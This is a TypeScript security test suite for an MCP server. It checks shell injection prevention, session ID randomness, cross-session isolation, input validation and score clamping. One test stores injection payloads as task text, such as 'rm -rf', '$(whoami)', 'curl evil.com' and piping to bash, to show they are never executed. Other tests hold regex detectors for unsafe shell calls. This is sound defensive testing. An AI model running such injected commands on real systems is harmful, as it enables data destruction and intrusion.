/**
 * Security tests for Open Swarm MCP server.
 * Covers:
 *   1. Shell injection prevention (code audit)
 *   2. Session ID enumeration resistance
 *   3. IDOR prevention
 *   4. Input validation
 *   5. Score bounds checking (code audit + runtime)
 */

import { describe, it, expect, afterEach } from "vitest";
import { readFileSync } from "fs";
import { resolve } from "path";

import {
  createSession,
  getSession,
  destroySession,
  sessions,
} from "../../src/session.js";

import {
  validateString,
  MAX_INPUT_LENGTH,
} from "../../src/tools/shared.js";

// ── helpers ───────────────────────────────────────────────────────────

const SRC = resolve(new URL(".", import.meta.url).pathname, "../../src");

function readSrc(file: string): string {
  return readFileSync(resolve(SRC, file), "utf8");
}

function parseResult(result: { content: Array<{ type: string; text: string }> }) {
  return JSON.parse(result.content[0].text);
}

// Track sessions created during tests so we can clean them up
const createdSessions: string[] = [];

function makeSession(task = "Test task") {
  const s = createSession("duo", task);
  createdSessions.push(s.id);
  return s;
}

afterEach(() => {
  // Clean up all sessions created during tests
  for (const id of createdSessions.splice(0)) {
    destroySession(id);
  }
});

// ════════════════════════════════════════════════════════════════════════
// 1. Shell Injection Prevention
// ════════════════════════════════════════════════════════════════════════

describe("Shell Injection Prevention", () => {
  it("lifecycle.ts uses writeFileSync, not shell heredoc for prompt files", () => {
    const src = readSrc("tools/lifecycle.ts");

    // MUST use writeFileSync to write prompt files (safe file I/O)
    expect(src).toMatch(/writeFileSync/);
  });

  it("lifecycle.ts has no shell heredoc pattern (cat <<EOF or <<'EOF')", () => {
    const src = readSrc("tools/lifecycle.ts");

    // Dangerous pattern: embedding user content directly in a shell heredoc
    expect(src).not.toMatch(/<<'?EOF/i);
    expect(src).not.toMatch(/cat\s*<<\s*[A-Z]/);
  });

  it("lifecycle.ts does not pipe prompt content into a shell command via template literal", () => {
    const src = readSrc("tools/lifecycle.ts");

    // Dangerous patterns: embedding prompt/user content directly into a shell exec call
    // e.g.  exec(`bash -c "${prompt}"`)  or  exec(`sh -c '${userInput}'`)
    expect(src).not.toMatch(/exec\s*\(\s*`[^`]*\$\{[^}]*(prompt|task|content|output)[^}]*\}/i);
    expect(src).not.toMatch(/execSync\s*\(\s*`[^`]*\$\{[^}]*(prompt|task|content|output)[^}]*\}/i);
    // Should NOT use echo to pipe untrusted content to a shell
    expect(src).not.toMatch(/echo\s+["']?\$\{.*prompt/i);
  });

  it("lifecycle.ts comment explicitly states writeFileSync avoids shell injection", () => {
    const src = readSrc("tools/lifecycle.ts");

    // The code has a comment documenting the security rationale
    expect(src).toMatch(/avoids shell injection/i);
  });

  it("dispatch.ts does not exec or spawn shell commands with prompt content", () => {
    const src = readSrc("tools/dispatch.ts");

    // dispatch.ts must not use exec/spawn/execSync with user content
    expect(src).not.toMatch(/exec\s*\(/);
    expect(src).not.toMatch(/spawn\s*\(/);
    expect(src).not.toMatch(/execSync\s*\(/);
    expect(src).not.toMatch(/spawnSync\s*\(/);
  });

  it("prompt-builder.ts does not embed shell metacharacters dangerously", () => {
    const src = readSrc("prompt-builder.ts");

    // Prompt builder should not call any shell exec functions
    expect(src).not.toMatch(/\bexec\s*\(/);
    expect(src).not.toMatch(/\bspawn\s*\(/);
  });

  it("prompts containing shell metacharacters are stored safely via writeFileSync", () => {
    // Runtime test: verify a session with shell-metacharacter content in the task
    // can be created and stored without crashing (no shell execution)
    const dangerousPayloads = [
      "Build app; rm -rf /tmp/test",
      "Deploy $(whoami) to prod",
      "Fix `id` auth bug",
      "Refactor auth && curl evil.com",
      "Update | bash",
    ];

    for (const payload of dangerousPayloads) {
      const session = makeSession(payload);
      // Session should be created successfully — no shell is invoked
      expect(session.task).toBe(payload);
      expect(session.id).toBeTruthy();
      // The task text is stored as-is in memory (not executed)
      const retrieved = getSession(session.id);
      expect(retrieved?.task).toBe(payload);
    }
  });
});

// ════════════════════════════════════════════════════════════════════════
// 2. Session ID Enumeration Resistance
// ════════════════════════════════════════════════════════════════════════

describe("Session ID Enumeration Resistance", () => {
  it("session IDs are not sequential integers", () => {
    const s1 = makeSession();
    const s2 = makeSession();

    // Must not be sequential numbers
    expect(Number.isInteger(Number(s1.id))).toBe(false);
    expect(Number.isInteger(Number(s2.id))).toBe(false);
  });

  it("session IDs embed a UUID v4 (cryptographically random)", () => {
    // Format: swarm-<uuid-v4>
    const uuidV4Regex = /^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

    for (let i = 0; i < 20; i++) {
      const s = makeSession();
      // Strip the "swarm-" prefix and validate UUID v4 portion
      const uuidPart = s.id.replace(/^swarm-/, "");
      expect(uuidPart).toMatch(uuidV4Regex);
    }
  });

  it("100 sessions all have unique IDs", () => {
    const ids = new Set<string>();

    for (let i = 0; i < 100; i++) {
      const s = makeSession(`Task ${i}`);
      ids.add(s.id);
    }

    expect(ids.size).toBe(100);
  });

  it("made-up session ID returns undefined (no enumeration)", () => {
    const fakeIds = [
      "swarm-00000000-0000-4000-8000-000000000000",
      "swarm-ffffffff-ffff-4fff-bfff-ffffffffffff",
      "non-existent-id",
      "swarm-1",
      "admin",
      "",
      "   ",
    ];

    for (const fakeId of fakeIds) {
      expect(getSession(fakeId)).toBeUndefined();
    }
  });

  it("session IDs are not guessable from creation time alone", () => {
    // Two sessions created in rapid succession should have completely different IDs
    const s1 = makeSession();
    const s2 = makeSession();

    expect(s1.id).not.toBe(s2.id);

    const uuid1 = s1.id.replace(/^swarm-/, "");
    const uuid2 = s2.id.replace(/^swarm-/, "");

    // They should differ by more than just the last few characters
    // (true randomness: at least half the hex chars should differ)
    const stripped1 = uuid1.replace(/-/g, "");
    const stripped2 = uuid2.replace(/-/g, "");

    let differences = 0;
    for (let i = 0; i < stripped1.length; i++) {
      if (stripped1[i] !== stripped2[i]) differences++;
    }
    // Expect significant differences (>= 8 out of 32 hex chars)
    expect(differences).toBeGreaterThanOrEqual(8);
  });
});

// ════════════════════════════════════════════════════════════════════════
// 3. IDOR Prevention (Insecure Direct Object Reference)
// ════════════════════════════════════════════════════════════════════════

describe("IDOR Prevention", () => {
  it("session A cannot access session B's workstreams", () => {
    const sessionA = makeSession("Task A");
    const sessionB = makeSession("Task B");

    // Add a workstream to session A
    sessionA.workstreams.push({
      id: "ws-secret",
      description: "Session A secret workstream",
      files: [],
      dependencies: [],
      status: "pending",
    });

    // Attempting to retrieve session B should not expose A's workstreams
    const retrievedB = getSession(sessionB.id);
    expect(retrievedB).toBeDefined();
    expect(retrievedB!.workstreams.find((w) => w.id === "ws-secret")).toBeUndefined();
  });

  it("getSession with wrong sessionId returns undefined", () => {
    const sessionA = makeSession("Task A");

    // Using session B's ID (never created) to look up
    const fakeBId = sessionA.id.slice(0, -4) + "xxxx";
    expect(getSession(fakeBId)).toBeUndefined();
  });

  it("board messages posted to session A do not appear in session B's board", () => {
    const sessionA = makeSession("Task A");
    const sessionB = makeSession("Task B");

    // Post a message to session A's board directly
    sessionA.board.push({
      id: "msg-a-1",
      workstream: "ws-0",
      type: "finding",
      content: "Sensitive finding for session A only",
      timestamp: Date.now(),
      level: "L1",
    });

    // Session B's board should be empty (not infected with A's messages)
    const retrievedB = getSession(sessionB.id);
    expect(retrievedB!.board.length).toBe(0);

    const hasCrossContamination = retrievedB!.board.some(
      (m) => m.content.includes("Sensitive finding for session A only"),
    );
    expect(hasCrossContamination).toBe(false);
  });

  it("session data is fully isolated between sessions", () => {
    const sessionA = makeSession("Task A");
    const sessionB = makeSession("Task B");

    // Mutate session A
    sessionA.task = "Modified task A";
    sessionA.maxLoops = 99;

    // Session B should be unaffected
    const retrievedB = getSession(sessionB.id);
    expect(retrievedB!.task).toBe("Task B");
    expect(retrievedB!.maxLoops).toBe(3); // default
  });

  it("destroySession removes session, cannot be re-accessed", () => {
    const session = makeSession("Temporary task");
    const id = session.id;

    // Remove from the cleanup list since we're destroying it manually
    const idx = createdSessions.indexOf(id);
    if (idx !== -1) createdSessions.splice(idx, 1);

    destroySession(id);
    expect(getSession(id)).toBeUndefined();
  });

  it("accessing a session by partial ID match does not succeed", () => {
    const session = makeSession("Partial ID test");
    const partialId = session.id.substring(0, 15);

    // Partial ID match should NOT work — must be exact
    expect(getSession(partialId)).toBeUndefined();
  });
});

// ════════════════════════════════════════════════════════════════════════
// 4. Input Validation (validateString)
// ════════════════════════════════════════════════════════════════════════

describe("Input Validation — validateString()", () => {
  it("rejects strings over the maximum length", () => {
    const tooLong = "a".repeat(MAX_INPUT_LENGTH + 1);
    const result = validateString(tooLong, "testField");

    expect(typeof result).not.toBe("string");
    const parsed = parseResult(result as { content: Array<{ type: string; text: string }> });
    expect(parsed.error).toMatch(/exceeds maximum length/i);
    expect(parsed.error).toContain("testField");
  });

  it("accepts strings at exactly the maximum length", () => {
    const exactMax = "a".repeat(MAX_INPUT_LENGTH);
    const result = validateString(exactMax, "testField");
    expect(result).toBe(exactMax);
  });

  it("rejects empty strings", () => {
    const result = validateString("", "testField");
    expect(typeof result).not.toBe("string");
    const parsed = parseResult(result as { content: Array<{ type: string; text: string }> });
    expect(parsed.error).toMatch(/missing or invalid/i);
  });

  it("rejects whitespace-only strings", () => {
    for (const ws of ["   ", "\t", "\n", " \n\t "]) {
      const result = validateString(ws, "testField");
      expect(typeof result).not.toBe("string");
      const parsed = parseResult(result as { content: Array<{ type: string; text: string }> });
      expect(parsed.error).toMatch(/missing or invalid/i);
    }
  });

  it("rejects numbers", () => {
    for (const num of [0, 1, -1, 3.14, NaN, Infinity]) {
      const result = validateString(num, "testField");
      expect(typeof result).not.toBe("string");
      const parsed = parseResult(result as { content: Array<{ type: string; text: string }> });
      expect(parsed.error).toMatch(/missing or invalid/i);
    }
  });

  it("rejects objects", () => {
    for (const obj of [{}, { key: "value" }, [], [1, 2, 3]]) {
      const result = validateString(obj, "testField");
      expect(typeof result).not.toBe("string");
      const parsed = parseResult(result as { content: Array<{ type: string; text: string }> });
      expect(parsed.error).toMatch(/missing or invalid/i);
    }
  });

  it("rejects null and undefined", () => {
    for (const val of [null, undefined]) {
      const result = validateString(val, "testField");
      expect(typeof result).not.toBe("string");
      const parsed = parseResult(result as { content: Array<{ type: string; text: string }> });
      expect(parsed.error).toMatch(/missing or invalid/i);
    }
  });

  it("rejects boolean values", () => {
    for (const val of [true, false]) {
      const result = validateString(val, "testField");
      expect(typeof result).not.toBe("string");
      const parsed = parseResult(result as { content: Array<{ type: string; text: string }> });
      expect(parsed.error).toMatch(/missing or invalid/i);
    }
  });

  it("accepts valid strings within limits", () => {
    const validCases = [
      "hello world",
      "Build a login page",
      "a",
      "a".repeat(100),
      "a".repeat(MAX_INPUT_LENGTH),
    ];

    for (const s of validCases) {
      const result = validateString(s, "testField");
      expect(result).toBe(s);
    }
  });

  it("handles Unicode characters without crashing", () => {
    const unicodeStrings = [
      "こんにちは世界",
      "🔐🛡️🔑",
      "Ünïcödé tëxt",
      "مرحبا بالعالم",
      "中文测试",
      "🚀".repeat(10),
    ];

    for (const s of unicodeStrings) {
      // Should not throw; returns string if valid, ToolResult if invalid
      expect(() => validateString(s, "testField")).not.toThrow();
    }
  });

  it("handles null bytes without crashing", () => {
    const withNullByte = "hello\x00world";
    expect(() => validateString(withNullByte, "testField")).not.toThrow();
    // Null byte string is non-empty, non-whitespace — it should be accepted
    const result = validateString(withNullByte, "testField");
    expect(result).toBe(withNullByte);
  });

  it("respects custom maxLength parameter", () => {
    const customMax = 50;
    const tooLong = "a".repeat(51);
    const justRight = "a".repeat(50);

    const rejected = validateString(tooLong, "testField", customMax);
    expect(typeof rejected).not.toBe("string");

    const accepted = validateString(justRight, "testField", customMax);
    expect(accepted).toBe(justRight);
  });

  it("includes field name in error message for debugging", () => {
    const result = validateString("", "mySpecialField");
    const parsed = parseResult(result as { content: Array<{ type: string; text: string }> });
    expect(parsed.error).toContain("mySpecialField");
  });
});

// ════════════════════════════════════════════════════════════════════════
// 5. Score Bounds Checking
// ════════════════════════════════════════════════════════════════════════

describe("Score Bounds Checking", () => {
  // Code-audit tests: verify gate.ts clamps scores and handles invalid input

  it("gate.ts clamps scores to [0, 10] range (code audit)", () => {
    const src = readSrc("tools/gate.ts");

    // Must have clamping logic for scores
    expect(src).toMatch(/Math\.max\s*\(\s*0\s*,\s*Math\.min\s*\(\s*10/);
  });

  it("gate.ts clamps criticalIssues to >= 0 (code audit)", () => {
    const src = readSrc("tools/gate.ts");

    // criticalIssues clamped at 0
    expect(src).toMatch(/Math\.max\s*\(\s*0\s*,\s*s\.criticalIssues\s*\)/);
  });

  it("gate.ts validates that scores array is required and is an array (code audit)", () => {
    const src = readSrc("tools/gate.ts");

    // Must check that scores is defined and is an array before using it
    expect(src).toMatch(/Array\.isArray\s*\(\s*args\.scores\s*\)/);
    expect(src).toMatch(/!args\.scores/);
  });

  it("Math.max(0, Math.min(10, score)) correctly clamps boundary values", () => {
    // Unit test the clamping math used in gate.ts directly
    const clamp = (s: number) => Math.max(0, Math.min(10, s));

    expect(clamp(-1)).toBe(0);
    expect(clamp(-100)).toBe(0);
    expect(clamp(0)).toBe(0);
    expect(clamp(5)).toBe(5);
    expect(clamp(10)).toBe(10);
    expect(clamp(11)).toBe(10);
    expect(clamp(100)).toBe(10);
  });

  it("NaN scores result in NaN after clamping — gate.ts should add isFinite guard (security finding)", () => {
    // Documents actual JS behavior: Math.max(0, Math.min(10, NaN)) === NaN
    // This is a security finding: gate.ts currently does NOT guard against NaN scores.
    // An attacker submitting NaN could cause unpredictable behavior in scoring logic.
    const clamp = (s: number) => Math.max(0, Math.min(10, s));

    // Actual JS behavior: NaN propagates through Math.min/max
    expect(clamp(NaN)).toBeNaN();

    // Defensive check: a safe guard would be: Number.isFinite(s) ? clamp(s) : 0
    // Note: Number.isFinite(Infinity) === false, so Infinity also maps to 0
    const safeClamp = (s: number) => Number.isFinite(s) ? Math.max(0, Math.min(10, s)) : 0;
    expect(safeClamp(NaN)).toBe(0);
    expect(safeClamp(Infinity)).toBe(0);   // Infinity is not finite — treated as invalid
    expect(safeClamp(-Infinity)).toBe(0);
    expect(safeClamp(5)).toBe(5);
    expect(safeClamp(10)).toBe(10);
    expect(safeClamp(-1)).toBe(0);
    expect(safeClamp(11)).toBe(10);
  });

  it("Infinity scores are clamped to 10", () => {
    const clamp = (s: number) => Math.max(0, Math.min(10, s));

    expect(clamp(Infinity)).toBe(10);
    expect(clamp(-Infinity)).toBe(0);
  });

  it("gate.ts requires scores array — missing scores yields error response (code audit)", () => {
    const src = readSrc("tools/gate.ts");

    // The guard that returns an error if scores are missing/not array
    expect(src).toMatch(/swarm_gate requires a "scores" array/i);
  });

  it("scores array items require workstream and score fields (code audit)", () => {
    const src = readSrc("tools/gate.ts");

    // gate.ts accesses s.score and s.workstream — it expects typed objects
    expect(src).toMatch(/s\.score/);
    expect(src).toMatch(/s\.workstream/);
    expect(src).toMatch(/s\.criticalIssues/);
  });

  it("session.ts uses randomUUID from crypto module (code audit)", () => {
    const src = readSrc("session.ts");

    // Must import from 'crypto' (Node built-in cryptographic RNG)
    expect(src).toMatch(/from ["']crypto["']/);
    expect(src).toMatch(/randomUUID/);
  });

  it("gate.ts threshold of 7/10 for passing is enforced (code audit)", () => {
    const src = readSrc("tools/gate.ts");

    // Passing threshold must be >= 7
    expect(src).toMatch(/score\s*>=\s*7/);
    expect(src).toMatch(/score\s*<\s*7/);
  });
});
